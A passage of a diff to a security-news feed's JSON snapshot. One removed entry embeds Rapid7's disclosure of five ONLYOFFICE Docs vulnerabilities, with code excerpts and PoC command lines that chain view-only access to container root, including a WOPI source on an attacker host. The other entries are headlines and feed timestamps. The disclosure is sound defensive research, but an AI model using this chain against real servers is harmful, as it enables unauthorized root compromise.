10.0.0-169 sendForm branch checks the user's role before starting the force-save: -if (conn.user) { +if (canStartForceSave(conn)) { canStartForceSave() requires an existing user whose view flag is false. On a Session JWT reconnect, the authentication flow also retrieves the stored callback for the user index instead of accepting the reconnecting client's callback value. In the 10.0.0-169 check, the view-only session opened, but sendForm was rejected and no exported file was saved. Exploit chains Two routes to container root share the DocBuilder authorization failure and root helper; their file-write stages differ. Both the direct DocBuilder chain and the file-read and traversal chain were demonstrated with a view-only Editor JWT and through the conditional WOPI entry below. Figure 4: Two file-write routes converge on command execution as ds and container root. Unauthenticated WOPI entry WOPI (Web Application Open Platform Interface) is a protocol for opening files from external storage in an online editor. WOPI must be enabled, which is not the default. DocumentServer must be able to reach the attacker-controlled source, and its address must pass the configured WOPI IP filter. The attacker submits a WOPISrc ending in / and an empty access token to the public launch endpoint. The launch logic in wopiClient.js contacts that source for editable document metadata and signs a Browser JWT: const access_token = req.body['access_token'] || ''; // [0] Empty token default // WOPI metadata is requested from the attacker-controlled source. const secret = yield tenantManager.getTenantSecret(ctx, commonDefines.c_oAscSecretType.Browser); params.token = jwt.sign(params, utils.getJwtHsKey(secret), options); // [1] Sign Browser JWT With an empty access token at [0] , DocumentServer trusts the returned metadata and issues a signed Browser JWT at [1] . The token's document key comes from createDocId() , which takes the final URL segment: const fileId = wopiSrc.substring(wopiSrc.lastIndexOf('/') + 1); // [2] URL file identifier let docId = undefined; if ('view' !== mode) { docId = `${fileId}`; // [3] Editable document key } The trailing slash makes fileId at [2] empty, which becomes the signed document key at [3] . Because Browser and Inbox tokens use the same signing key, /docbuilder accepts this WOPI Browser JWT as authorization. The empty key also selects the new-job branch in builderRequest() : let docId = params.key; // ... request setup omitted ... const needCreateId = !docId; // [4] Empty-key job creation // ... request validation omitted ... if (needCreateId) { const task = yield* taskResult.addRandomKeyTask(ctx, undefined, 'bld_', 8); // [5] Allocate job key docId = task.key; // ... context setup omitted ... } // ... script body stored under the new job key ... if (needCreateId) { // ... queue-data setup omitted ... yield* docsCoServer.addTask(queueData, constants.QUEUE_PRIORITY_LOW); // [6] Queue DocBuilder script } The empty key enables job creation at [4] ; [5] allocates a fresh key and [6] queues the posted script for execution. This provides an unauthenticated entry into the DocBuilder findings. DocBuilder chain Authorization: The /docbuilder authorization failure documented in Editor JWT Authorizes Native File Reads and Session JWT Forgery accepts the view-only Editor JWT instead of requiring a DocBuilder-specific token. Code execution: DocBuilder Conversion Parameter Injection Enables Code Execution makes X2T extract an attacker appender, command script, and runtime configuration outside the job directory. DocService loads the appender as ds . Root execution: The appender invokes Passwordless Maintenance Command Elevates ds to Root , and the passwordless helper executes the supplied command as root . The DocBuilder PoC runs this chain with a view-only Editor JWT: python3 pocs/docbuilder_savefile_params_rce.py \\ --documentserver https://docs.example.test \\ --token-file /secure/view-only.jwt \\ --root \\ --command whoami \\ --runtime-absent Output: root One malicious /docbuilder request triggers container-root execution. The PoC then makes additional /docbuilder requests to retrieve the command output. The direct SaveFile route also executed a command as root using a WOPI-issued Browser JWT, under the enablement, filter and reachability conditions above. File-read and traversal chain This path adds token forgery and a separate file-write stage: File read and token forgery: Editor JWT Authorizes Native File Reads and Session JWT Forgery uses the accepted editor or WOPI Browser JWT to read the session signing key and forge a save JWT. Code execution: Complete-Save Format Traversal Enables Arbitrary File Write uses that credential to install the appender, command script, and runtime configuration. DocService loads the appender as ds . Root execution: The appender invokes Passwordless Maintenance Command Elevates ds to Root , which executes the supplied command as root . The Editor-token PoC's --command mode installs the three execution files and invokes the root helper. It completed this chain from view-only access, returning uid=0(root) . The WOPI PoC performs this chain without a pre-existing JWT. It writes runtime.json last to trigger loading after the appender and command script are in place: python3 pocs/wopi_docbuilder_jwt_forgery.py \\ --documentserver https://docs.example.test \\ --public-wopi-src http://attacker.example.test:18084/document/ \\ --command whoami \\ --runtime-absent Output: root Under the WOPI conditions above, this chain requires no pre-existing DocumentServer account or token. Remediation Upgrade ONLYOFFICE Document Server to the latest supported release, version 10.0 or later. ONLYOFFICE confirmed that version 10.0 addresses all five findings. See the 10.0.0 security release notes and the vendor's Community Edition Docker update instructions . Disclosure timeline August 28, 2026: Rapid7 contacted ONLYOFFICE to report the five vulnerabilities under its coordinated disclosure policy. September 15–17, 2026: ONLYOFFICE acknowledged review of the reports and requested additional time to address the findings in an upcoming release. October 23, 2026: ONLYOFFICE confirmed that all five findings were fixed in Document Server 10.0. Rapid7 and ONLYOFFICE agreed on November 16 for public disclosure, allowing users time to update. November 16, 2026: Rapid7 publishes this analysis and the accompanying PoCs .",
-      "summary_excerpt": "Overview As part of our research into Zimbra Collaboration Suite , Rapid7 reported five findings in ONLYOFFICE Docs. An attacker with view-only access to a document can chain vulnerabilities in ONLYOFFICE Docs to execute arbitrary operating system commands as root inside the official DocumentServer container. The findings also expose server files and document data that the viewer never displays, even when downloading is disabled. CVE Finding CVSS CVE-2026-113627 DocBuilder native file read and Session JWT forgery 7.1 High CVE-2026-110385 DocBuilder SaveFile conversion parameter injection and c",
-      "threat_actors": [],
-      "title": "From view-only access to container root: five vulnerabilities in ONLYOFFICE Docs (FIXED)"
-    },
     {
       "ai_relevance": "material",
       "canonical_url": "https://www.rapid7.com/blog/post/etr-rapid7-detected-exploitation-of-cve-2026-90436-against-atlassian-confluence-data-center-n-able-n-central-also-exploited/",
@@ -701,36 +677,6 @@
       "summary_excerpt": "Overview On November 6, 2026, the Apache Software Foundation disclosed CVE-2026-90436 , a critical unsafe reflection vulnerability ( CWE-470 ) in Axis 1.x that allows for unauthenticated remote code execution (RCE). Apache Axis is a Simple Object Access Protocol (SOAP) implementation used for the creation of Java Web services. CISA has assigned CVE-2026-90436 a CVSS score of 9.8 Critical . Since the initial November 6 disclosure, it has transpired that some versions of Atlassian Confluence Data Center and N-able N-central use the affected Axis library and are vulnerable to CVE-2026-90436. Both",
       "threat_actors": [],
       "title": "Rapid7 Detected Exploitation of CVE-2026-90436 against Atlassian Confluence Data Center, N-able N-central also Exploited"
-    },
-    {
-      "ai_relevance": "none",
-      "canonical_url": "https://www.f5.com/labs/articles/cve-2026-119618",
-      "cves": [
-        "CVE-2026-119618"
-      ],
-      "document_form": "single_story",
-      "first_seen_at": "2026-11-17T02:23:44.096432+09:00",
-      "heat_score": 54.0,
-      "permalink_id": "article-url-9e47fa0ef11a70ea1452f771",
-      "primary_category": "vulnerability",
-      "public_article_id": "url:9e47fa0ef11a70ea1452f771",
-      "public_tags": [
-        {
-          "color_family": "neutral",
-          "key": "vulnerability",
-          "label": "Vulnerability"
-        }
-      ],
-      "published_at": "2026-11-17T01:03:00+09:00",
-      "published_at_future_suppressed": false,
-      "security_relevance": "primary",
-      "seen_in_kev": false,
-      "source_class": "topic_rss",
-      "source_name": "F5 Labs",
-      "summary": "A critical severity CVE in the mod_http2 Apache module was announced on November 11th, 2026. The following article summarizes currently known data about this vulnerability, possible impact, available detections, and suggested remediations.",
-      "summary_excerpt": "A critical severity CVE in the mod_http2 Apache module was announced on November 11th, 2026. The following article summarizes currently known data about this vulnerability, possible impact, available detections, and suggested remediations.",
-      "threat_actors": [],
-      "title": "CVE-2026-119618"
     },
     {
       "ai_relevance": "none",
@@ -915,6 +861,50 @@
       "summary_excerpt": "エレコム株式会社が提供する無線LANルータには、OSコマンドインジェクションの脆弱性が存在します。",
       "threat_actors": [],
       "title": "エレコム製無線LANルータにおけるOSコマンドインジェクションの脆弱性"
+    },
+    {
+      "ai_relevance": "none",
+      "canonical_url": "https://jvndb.jvn.jp/ja/contents/2026/JVNDB-2026-043752.html",
+      "cves": [],
+      "document_form": "single_story",
+      "first_seen_at": "2026-11-17T17:38:22.180723+09:00",
+      "heat_score": 46.8,
+      "permalink_id": "article-url-01d75ece53517a3f959754e7",
+      "primary_category": "other",
+      "public_article_id": "url:01d75ece53517a3f959754e7",
+      "public_tags": [],
+      "published_at": "2026-11-17T13:27:00+09:00",
+      "published_at_future_suppressed": false,
+      "security_relevance": "primary",
+      "seen_in_kev": false,
+      "source_class": "enrichment_rss",
+      "source_name": "JVN iPedia New",
+      "summary": "Microsoft Office Wordのヒープベースのバッファオーバーフローにより、権限のない攻撃者がローカルでコードを実行できる可能性があります。",
+      "summary_excerpt": "Microsoft Office Wordのヒープベースのバッファオーバーフローにより、権限のない攻撃者がローカルでコードを実行できる可能性があります。",
+      "threat_actors": [],
+      "title": "マイクロソフトのMicrosoft 365 Apps等の複数製品におけるヒープベースのバッファオーバーフローの脆弱性"
+    },
+    {
+      "ai_relevance": "none",
+      "canonical_url": "https://jvndb.jvn.jp/ja/contents/2026/JVNDB-2026-043558.html",
+      "cves": [],
+      "document_form": "single_story",
+      "first_seen_at": "2026-11-17T17:38:38.793657+09:00",
+      "heat_score": 46.8,
+      "permalink_id": "article-url-01e0fffed46ecf1340e4803f",
+      "primary_category": "other",
+      "public_article_id": "url:01e0fffed46ecf1340e4803f",
+      "public_tags": [],
+      "published_at": "2026-11-17T13:15:00+09:00",
+      "published_at_future_suppressed": false,
+      "security_relevance": "primary",
+      "seen_in_kev": false,
+      "source_class": "enrichment_rss",
+      "source_name": "JVN iPedia New",
+      "summary": "Dell OpenManage Enterpriseのバージョン4.8.0未満には、不適切な権限管理の脆弱性が存在します。ローカルアクセス権を持つ権限の低い攻撃者がこの脆弱性を悪用する可能性があり、権限が昇格される恐れがあります。",
+      "summary_excerpt": "Dell OpenManage Enterpriseのバージョン4.8.0未満には、不適切な権限管理の脆弱性が存在します。ローカルアクセス権を持つ権限の低い攻撃者がこの脆弱性を悪用する可能性があり、権限が昇格される恐れがあります。",
+      "threat_actors": [],
+      "title": "デルのDell OpenManage Enterpriseにおける権限管理に関する脆弱性"
     }
   ],
   "timeseries_status": {
@@ -935,32 +925,32 @@
     }
   },
   "ticker_items": [
-    "【LATEST #1】European Commission confirms cyberattack, says hackers used AI tool",
+    "【LATEST #1】PHP security updates fix 18 flaws, including critical RCE bugs",
     "【HOTTEST #1 / Heat 75】PHP Fixes 7 Critical Flaws, Including Bugs That Could Allow Remote Code Execution",
-    "【LATEST #2】Five warning signs of ransomware breach before encryption or data theft",
+    "【LATEST #2】What Is Preemptive MDR? A Guide For Security Leaders",
     "【HOTTEST #2 / Heat 75】ARMORY CASTLE Exploits vSphere",
-    "【LATEST #3】Critical NGINX ‘NGINX2Root’ bugs let attackers hijack servers",
+    "【LATEST #3】PHP Patches Seven Critical RCE Vulnerabilities",
     "【HOTTEST #3 / Heat 75】Exploited Puppet flaw puts the server that configures your endpoint fleet at risk (CVE-2026-115731)",
-    "【LATEST #4】「OpenJDK」に脆弱性、PoCも - 修正版が公開",
+    "【LATEST #4】‘What the hell is going on?’: Technology outages offer preview of US infrastructure’s messy, risky future",
     "【HOTTEST #4 / Heat 67.5】PHP Readies Critical Security Updates to Patch Another RCE Flaw",
-    "【LATEST #5】PHP Fixes 7 Critical Flaws, Including Bugs That Could Allow Remote Code Execution",
+    "【LATEST #5】CyberPower PowerPanel Exploited to Run Malicious Code on Domain Controller",
     "【HOTTEST #5 / Heat 67.5】OpenJDKにおけるヒープベースのバッファオーバーフローの脆弱性"
   ],
   "heat_history_evidence": {
     "source": "observed_hourly_news_gui_snapshots",
-    "first_as_of": "2026-11-16T16:00:00+00:00",
-    "last_as_of": "2026-11-19T16:00:00+00:00",
+    "first_as_of": "2026-11-16T17:00:00+00:00",
+    "last_as_of": "2026-11-19T17:00:00+00:00",
     "unique_snapshots_used": 72,
     "span_hours": 72.0,
     "skipped_invalid_snapshots": 0,
     "history_db_modified": false
   },
   "news_gui_mode": "news_current_heat_readonly_v1",
-  "news_as_of": "2026-11-19T16:00:00+00:00",
-  "heat_as_of": "2026-11-19T16:00:00+00:00",
+  "news_as_of": "2026-11-19T17:00:00+00:00",
+  "heat_as_of": "2026-11-19T17:00:00+00:00",
   "heat_status": "CURRENT_READ_ONLY",
   "heat_history_status": "OBSERVED_SNAPSHOTS",
-  "news_catalog_count": 25839,
-  "last_published_at": "2026-11-20T01:07:43.921017+09:00",
-  "publication_slot_jst": "2026-11-20T01:00:00+09:00"
+  "news_catalog_count": 25852,
+  "last_published_at": "2026-11-20T02:07:59.577803+09:00",
+  "publication_slot_jst": "2026-11-20T02:00:00+09:00"
 }
